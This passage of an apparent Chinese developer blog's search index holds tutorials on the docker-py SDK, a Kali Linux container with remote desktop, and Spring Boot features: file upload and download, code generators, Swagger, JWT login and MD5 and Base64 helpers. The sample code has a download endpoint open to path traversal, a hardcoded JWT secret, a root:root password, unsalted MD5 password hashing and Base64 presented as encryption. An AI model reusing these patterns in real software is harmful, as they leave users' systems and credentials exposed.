[self.get(r[&quot;Id&quot;]) for r in resp] 获取所有镜像import docker client = docker.from_env() imagesList = client.images.list() print(imagesList) get()该函数只有一个参数name，镜像名称 获取指定名称的镜像 import docker client = docker.from_env() mysqlImage = client.images.get(&quot;mysql&quot;) print(mysqlImage) search()与docker search 命令相同 searchList = client.images.search(&quot;nginx&quot;) print(searchList) pull()作用等同于docker pull client.images.pull(&quot;nginx&quot;) container相关操作容器相关的操作很多 run()官方注释 Run a container. By default, it will wait for the container to finish and return its logs, similar to ``docker run``. // If the ``detach`` argument is ``True``, it will start the container and immediately return a :py:class:`Container` object, similar to ``docker run -d``. port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx client.containers.run(image_name, ports=port_dict, detach=True) # 以守护进程的方式创建容器，容器停止后不会删除 ``` - The port number, as an integer. For example, ``&#123;&#x27;2222/tcp&#x27;: 3333&#125;`` will expose port 2222 inside the container as port 3333 on the host. - ``None``, to assign a random host port. For example, ``&#123;&#x27;2222/tcp&#x27;: None&#125;``. - A tuple of ``(address, port)`` if you want to specify the host interface. For example, ``&#123;&#x27;1111/tcp&#x27;: (&#x27;127.0.0.1&#x27;, 1111)&#125;``. - A list of integers, if you want to bind multiple host ports to a single container port. For example, ``&#123;&#x27;1111/tcp&#x27;: [1234, 4567]&#125;``. ``` get()获取容器对象 docker_container_id = &quot;236efe761aeb&quot; container = client.containers.get(docker_container_id) print(container.id) print(container.attrs) # 获取容器的详细信息 exec()进入容器内部执行命令，与下面的命令作用相同 docker exec -it containerID bash command = &#x27;touch /tmp/flag&#x27; port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx container = client.containers.run(image_name, ports=port_dict, detach=True) container.exec_run(command) network相关操作create使用默认参数，桥接模式创建网卡 client.networks.create(&quot;net1&quot;, driver=&quot;bridge&quot;) 使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254 ipam_pool = docker.types.IPAMPool( subnet=&#x27;192.168.52.0/24&#x27;, gateway=&#x27;192.168.52.254&#x27; ) ipam_config = docker.types.IPAMConfig( pool_configs=[ipam_pool] ) client.networks.create( &quot;network1&quot;, driver=&quot;bridge&quot;, ipam=ipam_config ) 创建kali攻击机镜像下载镜像docker pull kalilinux/kali-rolling 查看下载的镜像 docker images 启动容器docker run -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash 查看容器id docker ps 进入容器 docker exec -it id bash 安装基础环境包❗需要关闭防火墙或者打开3399端口，否则无法连接 首先安装vim apt-get -y update &amp;&amp; apt-get -y upgrade apt-get update --fix-missing apt-get install vim 修改镜像源 vim /etc/apt/sources.list 添加内容 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 安装基础环境包 apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get install -y \\ kali-tools-top10 \\ pciutils \\ iputils-ping \\ bash-completion &amp;&amp; \\ apt-get autoremove -y &amp;&amp; \\ apt-get clean 生成新镜像待上面的所有程序安装完成后，打包生成新镜像 docker commit f16618e0fda5 kali-2021 远程桌面环境安装使用新镜像启动容器docker run -itd -p 3399:3389 kali-2021 进入镜像 docker exec -it id bash 安装桌面服务● kali-desktop-xfce ：安装远程桌面环境 ● xrdp ：远程桌面服务 ● xorg：xorg是x11的一个实现，xorg提供X server apt-get update apt-get -y install kali-desktop-xfce xorg xrdp 配置xrdp实现远程连接图形界面： sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart 修改root用户密码： passwd root echo root:root|chpasswd 再次登录XRDP： 打包镜像docker commit id docker-attack 编写Dockerfile因为启动容器后需要运行 sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart 所有使用Dockerfile完成这两步操作 FROM kali-attack:latest COPY run.sh /home/run.sh RUN chmod +x /home/run.sh CMD [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;] 没有tail -f /dev/null会导致启动容器后自动退出无法使用，原因可能如下 run.sh中的内容，为启动容器后需要执行的两条命令 #!/bin/bash sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini wait service xrdp restart 使用 docker build -t kali-attack2 . 创建镜像，之后创建容器 docker run -itd -p 3399:3389 kali-attack2 这样就可以直接使用mstvc.exe连接kali桌面 username:root password:root docker访问宿主机网络资源解决方案 本文使用的的windows docker版本大于18.03可以直接使用host.docker.internal访问宿主机网络资源 其他操作系统的可以参考 docker容器安装vim出错报错信息如下 ncurses-base : Breaks: libtinfo5 (&lt; 6.1) but 6.0+20161126-1+deb9u2 is to be installed E: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages. E: Unable to correct dependencies 直接使用apt安装此包即可 apt update apt upgrade apt install vim","tags":[{"name":"docker","slug":"docker","permalink":"https://sunzhengyu99.github.io/tags/docker/"}]},{"title":"reggie","date":"2022-04-29T14:38:38.000Z","path":"2022/04/29/reggie/","text":"瑞吉外卖项目黑马程序员最新的springboot课程中的项目 项目地址为 瑞吉 代码全是跟着视频敲出来的，后面会对项目进行优化。","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springboot工具类","date":"2022-04-29T13:45:52.000Z","path":"2022/04/29/springbooot-upload-file/","text":"javaweb中图片文件上传和下载使用springboot创建web项目 服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件: commons-fileupload commons-io Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下： 1.创建Controller因为图片上传是一个公共接口所以可以创建一个名为CommonController的文件，url地址为/common /** * 主要用于文件上传和下载 */ @RestController @RequestMapping(&quot;/common&quot;) public class CommonController &#123; @Value(&quot;$&#123;reggie.path&#125;&quot;) // 保存图片的路径 private String basePath; &#125; 上传图片/** * 文件上传 * @param file * @return */ @PostMapping(&quot;/upload&quot;) public R&lt;String&gt; upload(MultipartFile file)&#123; // file是一个临时文件，后续需要进行转存 // file需要与前端上传的参数名保持一致，否则无法获取到上传的文件 // 转存之前需要对文件名进行处理 String originalFilename = file.getOriginalFilename(); String suffix = originalFilename.substring(originalFilename.lastIndexOf(&quot;.&quot;)); // 防止文件被覆盖，使用uuid作为文件名 String filename = UUID.randomUUID().toString(); filename = filename + suffix; File dir = new File(basePath); // 判断文件夹是否存在不存在则创建 if (!dir.exists())&#123; dir.mkdir(); &#125; // 将图片保存的指定位置 try &#123; file.transferTo(new File(basePath + filename)); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return R.success(filename); &#125; 下载图片@GetMapping(&quot;/download&quot;) public void download(String name, HttpServletResponse response) throws IOException &#123; // 文件输入流读取本地文件 FileInputStream fileInputStream = null; // 使用响应输出流将图片显示在网页上 ServletOutputStream outputStream = null; try &#123; fileInputStream = new FileInputStream(new File(basePath + name)); outputStream = response.getOutputStream(); response.setContentType(&quot;image/jpeg&quot;); byte[] bytes = new byte[1024]; int len = 0; // 读取服务器上的图片后 由响应输出流 while( (len = fileInputStream.read(bytes)) != -1)&#123; outputStream.write(bytes, 0, len); outputStream.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; fileInputStream.close(); outputStream.close(); &#125; &#125; 2.前端页面&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;!-- 引入样式 --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../plugins/element-ui/index.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/common.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/page.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;addBrand-container&quot; id=&quot;food-add-app&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;el-upload class=&quot;avatar-uploader&quot; action=&quot;/common/upload&quot; :show-file-list=&quot;false&quot; :on-success=&quot;handleAvatarSuccess&quot; :before-upload=&quot;beforeUpload&quot; ref=&quot;upload&quot;&gt; &lt;img v-if=&quot;imageUrl&quot; :src=&quot;imageUrl&quot; class=&quot;avatar&quot;&gt;&lt;/img&gt; &lt;i v-else class=&quot;el-icon-plus avatar-uploader-icon&quot;&gt;&lt;/i&gt; &lt;/el-upload&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt; &lt;script src=&quot;../../plugins/vue/vue.js&quot;&gt;&lt;/script&gt; &lt;!-- 引入组件库 --&gt; &lt;script src=&quot;../../plugins/element-ui/index.js&quot;&gt;&lt;/script&gt; &lt;!-- 引入axios --&gt; &lt;script src=&quot;../../plugins/axios/axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../../js/index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#food-add-app&#x27;, data() &#123; return &#123; imageUrl: &#x27;&#x27; &#125; &#125;, methods: &#123; handleAvatarSuccess (response, file, fileList) &#123; this.imageUrl = `/common/download?name=$&#123;response.data&#125;` &#125;, beforeUpload (file) &#123; if(file)&#123; const suffix = file.name.split(&#x27;.&#x27;)[1] const size = file.size / 1024 / 1024 &lt; 2 if([&#x27;png&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;].indexOf(suffix) &lt; 0)&#123; this.$message.error(&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;) this.$refs.upload.clearFiles() return false &#125; if(!size)&#123; this.$message.error(&#x27;上传文件大小不能超过 2MB!&#x27;) return false &#125; return file &#125; &#125; &#125; &#125;) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; mybatis-plus-generatorMP的代码生成器，可以节约创建文件的时间 1.导入依赖&lt;!--代码生成器--&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt; &lt;/dependency&gt; 2.编写生成器代码可以放在专门的工具类包下 package com.sunzy.utils; import com.baomidou.mybatisplus.generator.FastAutoGenerator; import com.baomidou.mybatisplus.generator.config.OutputFile; import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine; import java.util.Collections; /** * mp代码生成器 */ public class CodeGenreator &#123; public static void main(String[] args) &#123; generator(); &#125; public static void generator()&#123; FastAutoGenerator.create(&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;, &quot;username&quot;, &quot;password&quot;) .globalConfig(builder -&gt; &#123; builder.author(&quot;sunzy&quot;) // 设置作者 .enableSwagger() // 开启 swagger 模式 .fileOverride() // 覆盖已生成文件 .outputDir(&quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\java\\\\&quot;); // 指定输出目录 &#125;) .packageConfig(builder -&gt; &#123; builder.parent(&quot;com.sunzy&quot;) // 设置父包名 .moduleName(&quot;&quot;) // 设置父包模块名 .pathInfo(Collections.singletonMap(OutputFile.xml, &quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\resources\\\\mapper\\\\&quot;)); // 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改 &#125;) .strategyConfig(builder -&gt; &#123; builder.entityBuilder().enableLombok(); builder.mapperBuilder().enableMapperAnnotation().build(); builder.controllerBuilder().enableHyphenStyle() // 连字符转驼峰 .enableRestStyle(); // 开启rest控制器 builder.addInclude(&quot;sys_user&quot;) // 设置需要生成的表名 .addTablePrefix(&quot;t_&quot;, &quot;sys_&quot;); // 设置过滤表前缀 &#125;) // .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板 .execute(); &#125; &#125; 完成后，直接运行改工具类就可以直接生成以下文件： UserMapper.java IUserService.java UserServiceImpl.java UserController.java 3.Controller模板可以根据需要修改自己的模板 package $&#123;package.Controller&#125;; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import org.springframework.web.bind.annotation.*; import javax.annotation.Resource; import java.util.List; import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import $&#123;package.Service&#125;.$&#123;table.serviceName&#125;; import $&#123;package.Entity&#125;.$&#123;entity&#125;; #if($&#123;restControllerStyle&#125;) import org.springframework.web.bind.annotation.RestController; #else import org.springframework.stereotype.Controller; #end #if($&#123;superControllerClassPackage&#125;) import $&#123;superControllerClassPackage&#125;; #end /** * &lt;p&gt; * $!&#123;table.comment&#125; 前端控制器 * &lt;/p&gt; * * @author $&#123;author&#125; * @since $&#123;date&#125; */ #if($&#123;restControllerStyle&#125;) @RestController #else @Controller #end @RequestMapping(&quot;#if($&#123;package.ModuleName&#125;)/$&#123;package.ModuleName&#125;#end/#if($&#123;controllerMappingHyphenStyle&#125;)$&#123;controllerMappingHyphen&#125;#else$&#123;table.entityPath&#125;#end&quot;) #if($&#123;kotlin&#125;) class $&#123;table.controllerName&#125;#if($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end #else #if($&#123;superControllerClass&#125;) public class $&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123; #else public class $&#123;table.controllerName&#125; &#123; #end @Resource private $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service; // 新增或者更新 @PostMapping public boolean save(@RequestBody $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123; return $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;); &#125; @DeleteMapping(&quot;/&#123;id&#125;&quot;) public Boolean delete(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.removeById(id); &#125; @PostMapping(&quot;/del/batch&quot;) public boolean deleteBatch(@RequestBody List&lt;Integer&gt; ids) &#123; return $&#123;table.entityPath&#125;Service.removeById(ids); &#125; @GetMapping public List&lt;$&#123;entity&#125;&gt; findAll() &#123; return $&#123;table.entityPath&#125;Service.list(); &#125; @GetMapping(&quot;/&#123;id&#125;&quot;) public $&#123;entity&#125; findOne(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.getById(id); &#125; @GetMapping(&quot;/page&quot;) public Page&lt;$&#123;entity&#125;&gt; findPage(@RequestParam Integer pageNum, @RequestParam Integer pageSize) &#123; LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.orderByDesc(&quot;id&quot;); return $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper); &#125; &#125; #end 更多的模板可以到com.baomidou.mybatis-plus-generator包中复制到项目的resources\\templates中，根据自己的需求修改模板 Swagger1.导入依赖&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 2.创建配置类再com.sunzy.fmmall.config.SwaggerConfig路径下创建swagger的配置类 配置文档的封面信息 包括标题，版本，作者信息 修改需要扫面的controller包位置即可 package com.sunzy.fmmall.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2; @Configuration @EnableSwagger2 public class SwaggerConfig &#123; /** * swagger可以自动生成接口文档 * 1.配置生成文档的信息 * 2.配置生成规则 * */ /** * Docket用来封装接口文档 * * @return */ @Bean public Docket getDocket()&#123; //创建封面信息对象 ApiInfoBuilder apiInfoBuilder = new ApiInfoBuilder(); apiInfoBuilder.title(&quot;《锋迷商城》后端接口说明&quot;) .description(&quot;此文档详细说明了锋迷商城项目后端接口规范....&quot;) .version(&quot;v 2.0.1&quot;) .contact( new Contact(&quot;sunzy&quot;,&quot;www.suzny.com&quot;,&quot;sunzy@wang.com&quot;) ); ApiInfo apiInfo = apiInfoBuilder.build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) //指定生成的文档中的封面信息：文档标题、版本、作者 .select() .apis(RequestHandlerSelectors.basePackage(&quot;com.sunzy.fmmall.controller&quot;)) .paths(PathSelectors.any()) .build(); return docket; &#125; &#125; 启动springboot项目访问项目地址/swagger-ui.html即可看到相关接口信息，并可以进行测试 3.swagger注解说明 Swagger提供一套详细的注解可以对接口进行详细的说明 @Api 类注解，对控制器类添加此注解可以对控制器进行功能说明 @Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录服务&quot;) @ApiOperation 方法注解，对每个方法作用进行详细说明 @ApiOperation(&quot;用户登录接口&quot;) @ApiImplicitParams和@ApiImplicitParam 对方法中的参数进行详细的说明，包括字段名，备注，是否必须，以及默认值 @ApiImplicitParams( @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true) ) @ApiModel 当接口参数和返回值类型为对象类型是需要添加此注解 @ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;) @ApiModelProperty 模型中的成员变量进行说明 @ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;) private int code; @ApiIngnore接口方法注解，添加此注解的方法不会出现在接口文档中 4.swagger-ui插件导入插件依赖 &lt;!--swagger-ui插件依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; 访问url:http://localhost:8080/doc.html ,ui界面设计更加美观 tkMapper整合tkmapper 1.导入依赖&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.5&lt;/version&gt; &lt;/dependency&gt; 2.配置application.yml文件spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver username: root password: root url: jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false mybatis: mapper-locations: classpath:mapper/*Mapper.xml type-aliases-package: com.sunzy.fmmall.dao 3.修改启动类注意MapperScan需要使用tkmapper包中的 package com.sunzy.tkmapper; //import org.mybatis.spring.annotation.MapperScan; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import tk.mybatis.spring.annotation.MapperScan; @SpringBootApplication //@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) @MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) public class TkmapperDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(TkmapperDemoApplication.class, args); &#125; &#125; 4.逆向工程导入插件依赖 &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; 添加配置文件GeneratorConfig.xml 记得修改对应包名&lt;!--**--&gt;标记处需要修改 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt; &lt;generatorConfiguration&gt; &lt;!-- 引⼊数据库连接配置 --&gt; &lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt; &lt;context id=&quot;Mysql&quot; targetRuntime=&quot;MyBatis3Simple&quot; defaultModelType=&quot;flat&quot;&gt; &lt;property name=&quot;beginningDelimiter&quot; value=&quot;`&quot;/&gt; &lt;property name=&quot;endingDelimiter&quot; value=&quot;`&quot;/&gt; &lt;!-- 配置 GeneralDAO --&gt; &lt;plugin type=&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;&gt; &lt;property name=&quot;mappers&quot; value=&quot;com.sunzy.fmmall.general.GeneralDao&quot;/&gt;&lt;!--**--&gt; &lt;/plugin&gt; &lt;!-- 配置数据库连接 --&gt; &lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot; connectionURL=&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot; userId=&quot;root&quot; password=&quot;root&quot;&gt;&lt;!--**--&gt; &lt;/jdbcConnection&gt; &lt;!-- 配置实体类存放路径 --&gt; &lt;javaModelGenerator targetPackage=&quot;com.sunzy.fmmall.entity&quot; targetProject=&quot;src/main/java&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置 XML 存放路径 --&gt; &lt;sqlMapGenerator targetPackage=&quot;/&quot; targetProject=&quot;src/main/resources/mapper&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置 DAO 存放路径 --&gt; &lt;javaClientGenerator targetPackage=&quot;com.sunzy.fmmall.dao&quot; targetProject=&quot;src/main/java&quot; type=&quot;XMLMAPPER&quot;/&gt; &lt;!--**--&gt; &lt;!-- 配置需要指定⽣成的数据库和表，% 代表所有表 --&gt; &lt;table tableName=&quot;%&quot;&gt; &lt;!-- mysql 配置 --&gt; &lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;/table&gt; &lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;!-- &lt;table tableName=&quot;tb_permissions&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; 创建com.sunzy.fmmall.general.GeneralDao package com.sunzy.fmmall.general; import tk.mybatis.mapper.common.Mapper; import tk.mybatis.mapper.common.MySqlMapper; public interface GeneralDao&lt;T&gt; extends Mapper&lt;T&gt;, MySqlMapper&lt;T&gt; &#123; &#125; 在pom.xml中添加配置文件的位置 使用插件进行代码生成 JWT实现登录权限认证1.导入JWT依赖&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 2.生成对应的token并返回给前端// 验证成功则生成对应的token // 使用jwt生成token JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //设置subject .setIssuedAt(new Date()) // 设置token生成的时间 .setId(user.getUserId() + &quot;&quot;) // 设置userid为token的唯一id .setClaims(map) // map中可以存放用户的角色和权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // 设置token的过期时间 为两天 .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// 设置token的加密方式和加密密钥 String token = jwtBuilder.compact(); // 获取token return new ResultVO(ResStatus.OK, token, user); 3.前端进行登录验证时获取对应的token 4.JWT进行token解析if(token == null || &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try&#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token不合法请重新登录！&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token已过期，请重新登录！&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;未知错误&quot;, null); &#125; 5.使用拦截器验证token 创建拦截器 package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;请先登录！&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try &#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;token不合法，请重新登录！&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;token已过期，请重新登录！&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;未知错误！&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; 配置拦截器 package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 拦截器的配置类 */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registry是拦截器的注册器 // 将自己创建的拦截器加入进来 即可实现拦截功能 registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // 拦截所有路径 .excludePathPatterns(&quot;/user/**&quot;); // 除了用户登录和注册路径 &#125; &#125; 加密使用到工具类1.md5package com.qfedu.fmmall.utils; import java.math.BigInteger; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; //MD5 生成器 public class MD5Utils &#123; public static String md5(String password)&#123; //生成一个md5加密器 try &#123; MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;); //计算MD5 的值 md.update(password.getBytes()); //BigInteger 将8位的字符串 转成16位的字符串 得到的字符串形式是哈希码值 //BigInteger(参数1,参数2) 参数1 是 1为正数 0为0 -1为负数 return new BigInteger(1, md.digest()).toString(16); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; return null; &#125; &#125; 2.base64package com.qfedu.fmmall.utils; import java.util.Base64; //base64 加密 解密 激活邮件的时候 为 邮箱地址 code验证码 进行加密 //当 回传回来后 进行邮箱地址 和 code 的解密 public class Base64Utils &#123; //加密 public static String encode(String msg)&#123; return 